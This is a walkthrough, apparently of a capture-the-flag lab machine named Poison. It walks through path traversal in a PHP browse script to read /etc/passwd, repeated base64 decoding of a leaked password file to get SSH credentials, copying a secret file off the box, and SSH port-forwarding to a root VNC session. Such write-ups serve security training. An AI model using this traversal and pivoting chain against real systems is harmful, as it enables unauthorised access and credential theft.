Accessing to the webapp we try the scripts listed in the main page and we found the following:

```bash

http://10.10.10.84/browse.php?file=listfiles.php

Array ( [0] => . [1] => .. [2] => browse.php [3] => index.php [4] => info.php [5] => ini.php [6] => listfiles.php [7] => phpinfo.php [8] => pwdbackup.txt )

----------

http://10.10.10.84/browse.php?file=info.php

FreeBSD Poison 11.1-RELEASE FreeBSD 11.1-RELEASE #0 r321309: Fri Jul 21 02:08:28 UTC 2017 root@releng2.nyi.freebsd.org:/usr/obj/usr/src/sys/GENERIC amd64

----------

http://10.10.10.84/browse.php?file=pwdbackup.txt

This password is secure, it's encoded atleast 13 times.. what could go wrong really.. Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0 NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO Ukd4RVdub3dPVU5uUFQwSwo=

----------

http://10.10.10.84/browse.php?file=phpinfo.php

# PHP Version 5.6.32
|System|FreeBSD Poison 11.1-RELEASE FreeBSD 11.1-RELEASE #0 r321309: Fri Jul 21 02:08:28 UTC 2017 root@releng2.nyi.freebsd.org:/usr/obj/usr/src/sys/GENERIC amd64|
|Build Date|Jan 2 2018 17:01:44|

```

We can try to retrieve files from the system by escaping the current folder

```bash

http://10.10.10.84/browse.php?file=/../../../../../etc/passwd

 $FreeBSD: releng/11.1/etc/master.passwd 299365 2016-05-10 12:47:36Z bcr $ # 
 root:*:0:0:Charlie &:/root:/bin/csh 
 toor:*:0:0:Bourne-again Superuser:/root: 
 daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin 
 operator:*:2:5:System &:/:/usr/sbin/nologin 
 bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin 
 tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin 
 kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin 
 games:*:7:13:Games pseudo-user:/:/usr/sbin/nologin 
 news:*:8:8:News Subsystem:/:/usr/sbin/nologin 
 man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin 
 sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin 
 smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin 
 mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin 
 bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin 
 unbound:*:59:59:Unbound DNS Resolver:/var/unbound:/usr/sbin/nologin 
 proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin 
 _pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin 
 _dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin 
 uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico 
 pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin 
 auditdistd:*:78:77:Auditdistd unprivileged user:/var/empty:/usr/sbin/nologin 
 www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin 
 _ypldap:*:160:160:YP LDAP unprivileged user:/var/empty:/usr/sbin/nologin 
 hast:*:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin 
 nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin 
 _tss:*:601:601:TrouSerS user:/var/empty:/usr/sbin/nologin 
 messagebus:*:556:556:D-BUS Daemon User:/nonexistent:/usr/sbin/nologin 
 avahi:*:558:558:Avahi Daemon User:/nonexistent:/usr/sbin/nologin 
 cups:*:193:193:Cups Owner:/nonexistent:/usr/sbin/nologin 
 charix:*:1001:1001:charix:/home/charix:/bin/csh 
 ```

Only root and charix have terminal access. Lets decode the found base64 password

In the file it says that the password have been encoded 13 times, if we decode the base64 text will give us another base64 text. If we repeat the process we will have the password. We can do this manually but we will use bash scripting. We have pasted the base64 text in a file called pwd.b64, removed all the break lines and then we decode the text 13 times with a for loop

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Poison-10.10.10.84]
└─$ data=$(cat pwd.b64); for i in $(seq 1 13); do data=$(echo $data | base64 --decode); done; echo $data
Charix!2#4%6&8(0

┌──(kali㉿kali)-[~]
└─$ ssh charix@10.10.10.84
```

And we are in with `charix:Charix!2#4%6&8(0` credentials

In the charix folder we find a zip file called secret.zip, we try to move the file to our machine with a python upload server but Curl doesn't work. We try to encode to base64 too but it didn't work either. Finally we move the file with scp over SSH

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Poison-10.10.10.84]
└─$ scp -P 22 charix@10.10.10.84:/home/charix/secret.zip .
(charix@10.10.10.84) Password for charix@Poison:
secret.zip                                                                        100%  166     0.9KB/s   00:00    

┌──(kali㉿kali)-[~/Documents/Boxes/Poison-10.10.10.84]
└─$ ls
secret.zip
```

Once the file is in our machine we unzip with the user password and check what is it

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Poison-10.10.10.84]
└─$ unzip secret.zip      
Archive:  secret.zip
[secret.zip] secret password: 
 extracting: secret                  

┌──(kali㉿kali)-[~/Documents/Boxes/Poison-10.10.10.84]
└─$ ls
nmap  pwd.b64  secret  secret.zip

┌──(kali㉿kali)-[~/Documents/Boxes/Poison-10.10.10.84]
└─$ cat secret                             
��[|Ֆz!                                                                                                                    
┌──(kali㉿kali)-[~/Documents/Boxes/Poison-10.10.10.84]
└─$ file secret                    
secret: Non-ISO extended-ASCII text, with no line terminators
```

We don't know what is it, so lets check the server again

```bash
charix@Poison:~ % netstat -an -p tcp
Active Internet connections (including servers)
Proto Recv-Q Send-Q Local Address          Foreign Address        (state)
tcp4       0     44 10.10.10.84.22         10.10.14.21.39358      ESTABLISHED
tcp4       0      0 127.0.0.1.25           *.*                    LISTEN
tcp4       0      0 *.80                   *.*                    LISTEN
tcp6       0      0 *.80                   *.*                    LISTEN
tcp4       0      0 *.22                   *.*                    LISTEN
tcp6       0      0 *.22                   *.*                    LISTEN
tcp4       0      0 127.0.0.1.5801         *.*                    LISTEN
tcp4       0      0 127.0.0.1.5901         *.*                    LISTEN
```

Finding info about these ports we find that could be VNC service. 

![[Pasted image 20230830180150.png]]

Lets check the process to verify it

```bash
charix@Poison:~ % ps -auwwx | grep vnc
root   529   0.0  0.9  23620  8864 v0- I    16:29    0:00.02 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 120000 -rfbauth /root/.vnc/passwd -rfbport 5901 -localhost -nolisten tcp :1
```

And we found tightvnc service running in 5901 port, so lets use port forwarding through ssh and connect from our machine

```bash
┌──(kali㉿kali)-[~]
└─$ ssh -L 5901:127.0.0.1:5901 charix@10.10.10.84

-----------------

┌──(kali㉿kali)-[~/Documents/Boxes/Poison-10.10.10.84]
└─$ vncviewer -passwd secret 127.0.0.1:5901 
Connected to RFB server, using protocol version 3.8
Enabling TightVNC protocol extensions
Performing standard VNC authentication
Authentication successful
```

And a remote desktop will pop up with a terminal for the root user

![[Pasted image 20230830181027.png]]